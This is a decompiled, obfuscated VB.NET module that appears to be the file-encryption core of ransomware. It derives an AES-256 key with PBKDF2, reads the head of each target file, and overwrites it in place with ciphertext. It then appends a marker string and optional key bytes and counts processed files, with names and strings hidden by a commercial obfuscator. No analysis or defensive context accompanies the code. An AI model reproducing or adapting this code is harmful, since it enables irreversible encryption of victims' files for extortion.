Imports System
Imports System.IO
Imports System.IO.MemoryMappedFiles
Imports System.Security.Cryptography
Imports System.Text
Imports SmartAssembly.Delegates
Imports SmartAssembly.HouseOfCards

Namespace frgoWklvEOSV
	' Token: 0x02000018 RID: 24
	Public Module fkozHCDTDrY
		' Token: 0x06000088 RID: 136 RVA: 0x0000D660 File Offset: 0x0000B860
		Public Function GVHcoGquozRzL(byte_0 As Byte(), byte_1 As Byte(), byte_2 As Byte()) As Byte()
			Dim array As Byte() = Nothing
			Dim rfc2898DeriveBytes As Rfc2898DeriveBytes = fkozHCDTDrY.XPUhWjxaPSvB(byte_1, byte_2)
			byte_1 = Nothing
			GC.Collect()
			Using aes As Aes = New AesManaged()
				aes.KeySize = 256
				aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8)
				aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8)
				aes.Padding = PaddingMode.None
				aes.Mode = CipherMode.CBC
				Using memoryStream As MemoryStream = New MemoryStream()
					Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
						cryptoStream.Write(byte_0, 0, byte_0.Length)
						cryptoStream.Close()
					End Using
					array = memoryStream.ToArray()
				End Using
				rfc2898DeriveBytes.Dispose()
			End Using
			Return array
		End Function

		' Token: 0x06000089 RID: 137 RVA: 0x00002AA8 File Offset: 0x00000CA8
		Public Function XPUhWjxaPSvB(byte_0 As Byte(), byte_1 As Byte()) As Rfc2898DeriveBytes
			Return New Rfc2898DeriveBytes(byte_0, byte_1, 52768)
		End Function

		' Token: 0x0600008A RID: 138 RVA: 0x0000D74C File Offset: 0x0000B94C
		Public Function OlBXyEPnCYpDO(string_0 As String, int_0 As Integer) As Byte()
			Dim array As Byte() = New Byte(int_0 - 1) {}
			Dim array2 As Byte()
			Try
				If PFruJiQrcriiZ.POXokwFKrkkHxdVH = fkozHCDTDrY.getString_0(107396903) Then
					Dim memoryMappedFile As MemoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open)
					Dim memoryMappedViewStream As MemoryMappedViewStream = memoryMappedFile.CreateViewStream()
					memoryMappedFile.Dispose()
					memoryMappedViewStream.Read(array, 0, int_0)
					memoryMappedViewStream.Flush()
					memoryMappedViewStream.Close()
					memoryMappedViewStream.Dispose()
					array2 = array
				Else
					Dim fileStream As FileStream = New FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
					fileStream.Read(array, 0, int_0)
					fileStream.Close()
					fileStream.Dispose()
					array2 = array
				End If
			Catch ex As Exception
				If PFruJiQrcriiZ.joesCNAxeHUI Then
					Try
						File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, String.Concat(New String() { fkozHCDTDrY.getString_0(107386548), string_0, fkozHCDTDrY.getString_0(107401313), ex.Message, fkozHCDTDrY.getString_0(107396336) }))
					Catch ex2 As Exception
					End Try
				End If
				Dim fileStream2 As FileStream = New FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite)
				fileStream2.Read(array, 0, int_0)
				fileStream2.Close()
				fileStream2.Dispose()
				array2 = array
			End Try
			Return array2
		End Function

		' Token: 0x0600008B RID: 139 RVA: 0x0000D894 File Offset: 0x0000BA94
		Public Function wXhdORmUgbGuB(ZsIFKCtaED As String, quwoLGzcjeGYg As Byte(), Optional TTsauZziAEbN As Byte() = Nothing) As Boolean
			Dim flag As Boolean
			Try
				Dim array As Byte()
				If PFruJiQrcriiZ.POXokwFKrkkHxdVH = fkozHCDTDrY.getString_0(107396903) Then
					If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
						array = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)))
					Else
						array = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)))
					End If
					Dim memoryMappedFile As MemoryMappedFile = MemoryMappedFile.CreateFromFile(ZsIFKCtaED, FileMode.Open)
					Dim memoryMappedViewStream As MemoryMappedViewStream = memoryMappedFile.CreateViewStream()
					memoryMappedFile.Dispose()
					memoryMappedViewStream.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length)
					memoryMappedViewStream.Flush()
					memoryMappedViewStream.Close()
					memoryMappedViewStream.Dispose()
					Using fileStream As FileStream = New FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
							fileStream.Write(array, 0, array.Length)
						Else
							fileStream.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length)
							fileStream.Write(array, 0, array.Length)
						End If
						GoTo IL_242
					End Using
				End If
				If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
					array = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)))
				Else
					array = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)))
				End If
				Dim fileStream2 As FileStream = New FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
				fileStream2.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length)
				fileStream2.Close()
				fileStream2.Dispose()
				Using fileStream3 As FileStream = New FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
					If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
						fileStream3.Write(array, 0, array.Length)
					Else
						fileStream3.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length)
						fileStream3.Write(array, 0, array.Length)
					End If
				End Using
				IL_242:
				PFruJiQrcriiZ.XnicJWCgBOO += 1
				Return True
			Catch ex As Exception
				If PFruJiQrcriiZ.joesCNAxeHUI Then
					Try
						File.AppendAllText(PFruJiQrcriiZ.jnRLNtXuRRg, String.Concat(New String() { fkozHCDTDrY.getString_0(107386548), ZsIFKCtaED, fkozHCDTDrY.getString_0(107401246), ex.Message, fkozHCDTDrY.getString_0(107396336) }))
					Catch ex2 As Exception
					End Try
				End If
				Try
					Dim array2 As Byte()
					If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
						array2 = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401296)))
					Else
						array2 = Encoding.ASCII.GetBytes(PFruJiQrcriiZ.GwTsezEgVAuVAU(PFruJiQrcriiZ.aEpEnRRNDPnpp) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)) + Convert.ToString(PFruJiQrcriiZ.xYkYbBCyjIxz) + PFruJiQrcriiZ.GwTsezEgVAuVAU(fkozHCDTDrY.getString_0(107401255)))
					End If
					Dim fileStream4 As FileStream = New FileStream(ZsIFKCtaED, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite)
					fileStream4.Write(quwoLGzcjeGYg, 0, quwoLGzcjeGYg.Length)
					fileStream4.Close()
					fileStream4.Dispose()
					Using fileStream5 As FileStream = New FileStream(ZsIFKCtaED, FileMode.Append, FileAccess.Write, FileShare.ReadWrite)
						If Not PFruJiQrcriiZ.IooTTsvIiwCN Then
							fileStream5.Write(array2, 0, array2.Length)
						Else
							fileStream5.Write(TTsauZziAEbN, 0, TTsauZziAEbN.Length)
							fileStream5.Write(array2, 0, array2.Length)
						End If
					End Using
					flag = True
				Catch ex3 As Exception
					flag = False
				End Try
			End Try
			Return flag
		End Function

		' Token: 0x0600008C RID: 140 RVA: 0x00002AB6 File Offset: 0x00000CB6
		Shared Sub New()
			Strings.CreateGetStringDelegate(GetType(fkozHCDTDrY))
		End Sub

		' Token: 0x0400009D RID: 157
		<NonSerialized()>
		Friend getString_0 As GetString
	End Module
End Namespace
